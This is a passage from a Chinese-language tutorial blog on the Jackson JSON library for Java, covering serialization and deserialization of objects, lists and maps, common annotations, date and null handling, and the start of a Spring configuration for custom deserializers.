id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Jackson反序列化时需要无参构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(<span class="type">int</span> id, String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 省略 getters 和 setters...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-1-基本操作"><a href="#3-1-基本操作" class="headerlink" title="3.1 基本操作"></a>3.1 基本操作</h3><h4 id="3-1-1-对象与JSON字符串互转"><a href="#3-1-1-对象与JSON字符串互转" class="headerlink" title="3.1.1 对象与JSON字符串互转"></a>3.1.1 对象与JSON字符串互转</h4><p>这是最基础也是最核心的功能。</p>
<ul>
<li><p><strong>序列化：Java对象 → JSON字符串</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 创建一个Java对象</span></span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">1</span>, <span class="string">&quot;Alice&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 使用writeValueAsString()进行序列化</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> mapper.writeValueAsString(user);</span><br><span class="line">    <span class="comment">// 输出: &#123;&quot;id&quot;:1,&quot;name&quot;:&quot;Alice&quot;&#125;</span></span><br><span class="line">    System.out.println(jsonString);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果需要格式化（美化）输出，便于阅读:</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">prettyJsonString</span> <span class="operator">=</span> mapper.writerWithDefaultPrettyPrinter().writeValueAsString(user);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 输出:</span></span><br><span class="line"><span class="comment">     * &#123;</span></span><br><span class="line"><span class="comment">     *   &quot;id&quot; : 1,</span></span><br><span class="line"><span class="comment">     *   &quot;name&quot; : &quot;Alice&quot;</span></span><br><span class="line"><span class="comment">     * &#125;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    System.out.println(prettyJsonString);</span><br><span class="line">&#125; <span class="keyword">catch</span> (JsonProcessingException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>反序列化：JSON字符串 → Java对象</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 准备一个JSON字符串</span></span><br><span class="line"><span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;id\&quot;:2,\&quot;name\&quot;:\&quot;Bob\&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 使用readValue()进行反序列化</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> mapper.readValue(jsonString, User.class);</span><br><span class="line">    <span class="comment">// 现在你可以像使用普通Java对象一样使用它</span></span><br><span class="line">    System.out.println(user.getName()); <span class="comment">// 输出: Bob</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (JsonProcessingException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h4 id="3-1-2-List-Map与JSON互转"><a href="#3-1-2-List-Map与JSON互转" class="headerlink" title="3.1.2 List&#x2F;Map与JSON互转"></a>3.1.2 List&#x2F;Map与JSON互转</h4><p>处理集合是API开发中的常见需求。</p>
<ul>
<li><p><strong>序列化：<code>List</code>&#x2F;<code>Map</code> → JSON</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 序列化List为JSON数组</span></span><br><span class="line">List&lt;User&gt; userList = Arrays.asList(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">1</span>, <span class="string">&quot;Alice&quot;</span>), <span class="keyword">new</span> <span class="title class_">User</span>(<span class="number">2</span>, <span class="string">&quot;Bob&quot;</span>));</span><br><span class="line"><span class="type">String</span> <span class="variable">jsonArray</span> <span class="operator">=</span> mapper.writeValueAsString(userList);</span><br><span class="line"><span class="comment">// 输出: [&#123;&quot;id&quot;:1,&quot;name&quot;:&quot;Alice&quot;&#125;,&#123;&quot;id&quot;:2,&quot;name&quot;:&quot;Bob&quot;&#125;]</span></span><br><span class="line">System.out.println(jsonArray);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化Map为JSON对象</span></span><br><span class="line">Map&lt;String, Object&gt; dataMap = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();</span><br><span class="line">dataMap.put(<span class="string">&quot;status&quot;</span>, <span class="string">&quot;SUCCESS&quot;</span>);</span><br><span class="line">dataMap.put(<span class="string">&quot;data&quot;</span>, userList);</span><br><span class="line"><span class="type">String</span> <span class="variable">jsonObject</span> <span class="operator">=</span> mapper.writeValueAsString(dataMap);</span><br><span class="line"><span class="comment">// 输出: &#123;&quot;status&quot;:&quot;SUCCESS&quot;,&quot;data&quot;:[&#123;&quot;id&quot;:1,&quot;name&quot;:&quot;Alice&quot;&#125;,&#123;&quot;id&quot;:2,&quot;name&quot;:&quot;Bob&quot;&#125;]&#125;</span></span><br><span class="line">System.out.println(jsonObject);</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>反序列化：JSON → <code>List</code>&#x2F;<code>Map</code></strong></p>
<p><strong>关键点</strong>：由于Java的<strong>类型擦除 (Type Erasure)</strong>，在反序列化泛型集合（如<code>List&lt;User&gt;</code>）时，不能简单地使用<code>List.class</code>。必须使用<code>TypeReference</code>来捕获完整的泛型类型信息。</p>
<ul>
<li><p><strong>JSON数组 → <code>List</code> (正确方式)</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="string">&quot;[&#123;\&quot;id\&quot;:1,\&quot;name\&quot;:\&quot;Alice\&quot;&#125;,&#123;\&quot;id\&quot;:2,\&quot;name\&quot;:\&quot;Bob\&quot;&#125;]&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 错误方式: mapper.readValue(jsonArray, List.class);</span></span><br><span class="line"><span class="comment">// 这会得到一个 List&lt;LinkedHashMap&gt;，而不是 List&lt;User&gt;，并在后续操作中导致 ClassCastException。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确方式: 使用TypeReference</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    List&lt;User&gt; userList = mapper.readValue(jsonArray, <span class="keyword">new</span> <span class="title class_">TypeReference</span>&lt;List&lt;User&gt;&gt;() &#123;&#125;);</span><br><span class="line">    System.out.println(userList.get(<span class="number">0</span>).getName()); <span class="comment">// 输出: Alice</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (JsonProcessingException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>JSON对象 → <code>Map</code></strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;code\&quot;:200,\&quot;message\&quot;:\&quot;OK\&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 对于Map，同样推荐使用TypeReference，这是一种好习惯</span></span><br><span class="line">    Map&lt;String, Object&gt; dataMap = mapper.readValue(jsonObject, <span class="keyword">new</span> <span class="title class_">TypeReference</span>&lt;Map&lt;String, Object&gt;&gt;() &#123;&#125;);</span><br><span class="line">    System.out.println(dataMap.get(<span class="string">&quot;message&quot;</span>)); <span class="comment">// 输出: OK</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (JsonProcessingException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<hr>
<h3 id="3-2-常用注解与配置"><a href="#3-2-常用注解与配置" class="headerlink" title="3.2 常用注解与配置"></a>3.2 常用注解与配置</h3><p><strong>准备工作：示例类 <code>Product</code></strong></p>
<p>以下所有示例都将围绕这个<code>Product</code>类展开，以便清晰地展示各个注解和配置的效果。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 可以在类级别上进行配置</span></span><br><span class="line"><span class="comment">// @JsonInclude(JsonInclude.Include.NON_NULL) // 示例：全局忽略null值</span></span><br><span class="line"><span class="comment">// @JsonIgnoreProperties(ignoreUnknown = true) // 示例：反序列化时忽略未知字段</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Product</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> productId;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 3.2.1 字段重命名</span></span><br><span class="line">    <span class="meta">@JsonProperty(&quot;product_name&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> BigDecimal price;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 3.2.3 日期格式化</span></span><br><span class="line">    <span class="meta">@JsonFormat(pattern = &quot;yyyy-MM-dd HH:mm:ss&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> LocalDateTime createdTime;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 3.2.2 忽略字段</span></span><br><span class="line">    <span class="meta">@JsonIgnore</span></span><br><span class="line">    <span class="keyword">private</span> String internalNotes; <span class="comment">// 内部备注，不希望暴露给前端</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 3.2.4 null值处理</span></span><br><span class="line">    <span class="meta">@JsonInclude(JsonInclude.Include.NON_NULL)</span></span><br><span class="line">    <span class="keyword">private</span> String description; <span class="comment">// 描述可能为null</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 3.2.4 空集合处理</span></span><br><span class="line">    <span class="meta">@JsonInclude(JsonInclude.Include.NON_EMPTY)</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;String&gt; tags; <span class="comment">// 标签列表可能为空</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Getters and Setters...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="3-2-1-字段重命名"><a href="#3-2-1-字段重命名" class="headerlink" title="3.2.1 字段重命名"></a>3.2.1 字段重命名</h4><p>在Java中我们习惯使用驼峰命名（<code>camelCase</code>），而在很多前端或API规范中，下划线命名（<code>snake_case</code>）更常见。</p>
<ul>
<li><p><strong>方式一：使用 <code>@JsonProperty</code> (逐个字段)</strong><br>这是最直接的方式，可以为每个字段单独指定JSON中的名称。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在Product类的name字段上</span></span><br><span class="line"><span class="meta">@JsonProperty(&quot;product_name&quot;)</span></span><br><span class="line"><span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化效果:</span></span><br><span class="line"><span class="type">Product</span> <span class="variable">product</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Product</span>();</span><br><span class="line">product.setName(<span class="string">&quot;My Awesome Gadget&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(product);</span><br><span class="line"><span class="comment">// 输出的JSON中，字段名为 &quot;product_name&quot;，而不是 &quot;name&quot;</span></span><br><span class="line"><span class="comment">// &#123;&quot;productId&quot;:0,&quot;product_name&quot;:&quot;My Awesome Gadget&quot;, ...&#125;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>方式二：全局配置 <code>PropertyNamingStrategy</code> (推荐)</strong><br>如果整个项目都需要统一的命名风格转换，全局配置是更高效、更规范的做法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建或配置ObjectMapper实例</span></span><br><span class="line"><span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置全局命名策略为下划线风格</span></span><br><span class="line">mapper.setPropertyNamingStrategy(PropertyNamingStrategies.SNAKE_CASE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化效果 (此时Product类无需@JsonProperty注解)</span></span><br><span class="line"><span class="type">Product</span> <span class="variable">product</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Product</span>();</span><br><span class="line">product.setProductId(<span class="number">101</span>); <span class="comment">// Java字段是 productId</span></span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(product);</span><br><span class="line"><span class="comment">// 输出的JSON中，所有驼峰字段都会自动转为下划线</span></span><br><span class="line"><span class="comment">// &#123;&quot;product_id&quot;:101, &quot;name&quot;:null, ...&#125; </span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h4 id="3-2-2-忽略字段"><a href="#3-2-2-忽略字段" class="headerlink" title="3.2.2 忽略字段"></a>3.2.2 忽略字段</h4><p>有时候我们不希望将对象的某些字段序列化到JSON中，比如密码、内部状态等。</p>
<ul>
<li><p><strong>方式一：使用 <code>@JsonIgnore</code> (常用)</strong><br>在需要忽略的字段上添加此注解。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在Product类的internalNotes字段上</span></span><br><span class="line"><span class="meta">@JsonIgnore</span></span><br><span class="line"><span class="keyword">private</span> String internalNotes;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化效果:</span></span><br><span class="line"><span class="type">Product</span> <span class="variable">product</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Product</span>();</span><br><span class="line">product.setInternalNotes(<span class="string">&quot;Top secret memo!&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(product);</span><br><span class="line"><span class="comment">// 输出的JSON中完全不包含 internalNotes 字段</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>方式二：使用 <code>@JsonIgnoreProperties</code></strong><br>在类级别上声明要忽略的一个或多个字段。这对于忽略从父类继承的字段特别有用。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在Product类声明上</span></span><br><span class="line"><span class="meta">@JsonIgnoreProperties(&#123;&quot;price&quot;, &quot;tags&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Product</span> &#123; ... &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 同时，它也常用于反序列化时忽略JSON中多余的字段，防止报错</span></span><br><span class="line"><span class="meta">@JsonIgnoreProperties(ignoreUnknown = true)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Product</span> &#123; ... &#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h4 id="3-2-3-日期格式化"><a href="#3-2-3-日期格式化" class="headerlink" title="3.2.3 日期格式化"></a>3.2.3 日期格式化</h4><p>Jackson默认可能会将日期序列化为时间戳（一个长整型数字）或ISO-8601格式的数组。我们通常需要一个可读的字符串格式。</p>
<ul>
<li><p><strong>方式一：使用 <code>@JsonFormat</code> (推荐)</strong><br>在日期类型的字段上，指定你想要的格式。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在Product类的createdTime字段上 (类型为LocalDateTime)</span></span><br><span class="line"><span class="meta">@JsonFormat(pattern = &quot;yyyy-MM-dd HH:mm:ss&quot;)</span></span><br><span class="line"><span class="keyword">private</span> LocalDateTime createdTime;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化效果:</span></span><br><span class="line"><span class="type">Product</span> <span class="variable">product</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Product</span>();</span><br><span class="line">product.setCreatedTime(LocalDateTime.now());</span><br><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(product);</span><br><span class="line"><span class="comment">// 输出的JSON中，日期格式为 &quot;2023-10-27 10:30:00&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>：要使<code>@JsonFormat</code>对<code>java.time.*</code>包下的日期类型生效，必须确保<code>ObjectMapper</code>注册了<code>JavaTimeModule</code>。</p>
</li>
<li><p><strong>方式二：全局配置</strong><br>如果你希望应用中所有日期都使用同一种格式，可以进行全局配置。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">mapper.registerModule(<span class="keyword">new</span> <span class="title class_">JavaTimeModule</span>());</span><br><span class="line"><span class="comment">// 关键：禁用将日期写成时间戳的默认行为</span></span><br><span class="line">mapper.disable(SerializationFeature.WRITE_DATES_AS_TIMESTAMPS);</span><br><span class="line"><span class="comment">// 对于旧的java.util.Date，可以这样设置</span></span><br><span class="line"><span class="comment">// mapper.setDateFormat(new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;));</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h4 id="3-2-4-null值与空集合处理"><a href="#3-2-4-null值与空集合处理" class="headerlink" title="3.2.4 null值与空集合处理"></a>3.2.4 <code>null</code>值与空集合处理</h4><p>为了减少JSON传输的体积，我们常常希望不序列化值为<code>null</code>的字段或空的集合&#x2F;数组。</p>
<ul>
<li><p><strong><code>@JsonInclude</code> 注解</strong><br>这是一个功能强大的注解，可以应用在字段级别或类级别。</p>
<ul>
<li><p><strong><code>Include.NON_NULL</code></strong>: 只在值不为<code>null</code>时序列化。这是最常用的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在Product类的description字段上</span></span><br><span class="line"><span class="meta">@JsonInclude(JsonInclude.Include.NON_NULL)</span></span><br><span class="line"><span class="keyword">private</span> String description;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 效果: 如果product.getDescription()为null，JSON中将没有description字段。</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>Include.NON_EMPTY</code></strong>: 在值不为<code>null</code>且不为空（对于String, Collection, Map, Array）时序列化。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在Product类的tags字段上</span></span><br><span class="line"><span class="meta">@JsonInclude(JsonInclude.Include.NON_EMPTY)</span></span><br><span class="line"><span class="keyword">private</span> List&lt;String&gt; tags;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 效果:</span></span><br><span class="line"><span class="comment">// 1. 如果tags为null，不序列化。</span></span><br><span class="line"><span class="comment">// 2. 如果tags是 new ArrayList&lt;&gt;()，不序列化。</span></span><br><span class="line"><span class="comment">// 3. 只有当tags里有元素时，才序列化为 &quot;tags&quot;: [&quot;tag1&quot;, &quot;tag2&quot;]。</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>全局配置</strong><br>同样，这也可以作为一项全局策略在<code>ObjectMapper</code>上设置。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line"><span class="comment">// 设置全局策略：所有对象的null值字段都不序列化</span></span><br><span class="line">mapper.setSerializationInclusion(JsonInclude.Include.NON_NULL);</span><br></pre></td></tr></table></figure>

<p><strong>最佳实践</strong>：通常建议设置一个全局的<code>NON_NULL</code>策略，然后对需要特殊处理的字段（如<code>NON_EMPTY</code>）再单独使用注解。</p>
</li>
</ul>
<hr>
<h3 id="3-3-进阶用法"><a href="#3-3-进阶用法" class="headerlink" title="3.3 进阶用法"></a>3.3 进阶用法</h3><h4 id="3-3-1-自定义序列化器-反序列化器"><a href="#3-3-1-自定义序列化器-反序列化器" class="headerlink" title="3.3.1 自定义序列化器&#x2F;反序列化器"></a>3.3.1 自定义序列化器&#x2F;反序列化器</h4><p><strong>场景</strong>：需要对某个类型的转换逻辑进行完全的、自定义的控制。</p>
<ul>
<li>将一个复杂的Java对象序列化为一个简单的字符串。</li>
<li>将一个枚举序列化为一个包含<code>code</code>的JSON对象。</li>
<li>处理与第三方系统对接时的非标准JSON格式。</li>
</ul>
<p><strong>实现方式</strong>：</p>
<ol>
<li><strong>全局配置 (Global Configuration)</strong>：通过配置全局 <code>ObjectMapper</code>，对某一类型（如所有枚举、所有日期）在整个应用中实施<strong>统一的转换规则</strong>。</li>
<li><strong>局部注解 (Local Annotation)</strong>：通过在 POJO 的字段上添加注解，对特定目标进行<strong>精细化、独立的控制</strong>。</li>
</ol>
<h5 id="1-全局配置：通过-Module-实现统一转换"><a href="#1-全局配置：通过-Module-实现统一转换" class="headerlink" title="1. 全局配置：通过 Module 实现统一转换"></a>1. 全局配置：通过 <code>Module</code> 实现统一转换</h5><p>此方法的核心是在 Spring Boot 应用启动时，向 IoC 容器注册一个自定义配置的 <code>ObjectMapper</code> Bean，使其成为默认的 JSON 处理器。</p>
<p><strong>核心思想</strong>：<strong>集中管理、全局一致</strong>。所有自定义转换逻辑都集中在一个配置类中，确保了整个应用中同一类型的对象在序列化&#x2F;反序列化时行为一致。</p>
<p><strong>适用场景</strong>：</p>
<ul>
<li><strong>规范统一</strong>：为所有枚举类型定义统一的 JSON 格式（例如，统一使用 <code>code</code> 值或枚举名）。</li>
<li><strong>常用类型处理</strong>：统一处理 <code>LocalDateTime</code>、<code>LocalDate</code>、<code>BigDecimal</code> 等类型的格式。</li>
<li><strong>代码复用</strong>：当有大量相似的转换需求时（如几十个枚举），此方法能极大减少重复代码。</li>
</ul>
<p><strong>实现方式</strong>：</p>
<ol>
<li>创建一个 <code>@Configuration</code> 类。</li>
<li>定义一个返回 <code>ObjectMapper</code> 的 <code>@Bean</code> 方法，并使用 <code>@Primary</code> 注解确保其被优先注入。</li>
<li>在方法内，创建 <code>ObjectMapper</code> 实例并进行基础配置（如 <code>FAIL_ON_UNKNOWN_PROPERTIES</code>）。</li>
<li>创建一个或多个 <code>Module</code> (通常是 <code>SimpleModule</code>)，用于承载自定义的（反）序列化器。</li>
<li>向 <code>Module</code> 中添加针对特定类型的转换器，如 <code>module.addDeserializer(MyEnum.class, new MyEnumDeserializer())</code>。</li>
<li>将配置好的 <code>Module</code> 注册到 <code>ObjectMapper</code> 中：<code>mapper.registerModule(module)</code>。</li>
</ol>
<p><strong>示例</strong>：在整个应用中，将不同枚举根据其值类型（<code>int</code> 或 <code>String</code>）进行反序列化。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Jackson JSON处理库的全局配置类</span></span><br><span class="line"><span class="comment"> * 通过注册自定义Module，为多种枚举类型提供统一的反序列化解决方案。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JacksonConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@Primary</span></span><br><span class="line">    <span class="keyword">public</span> 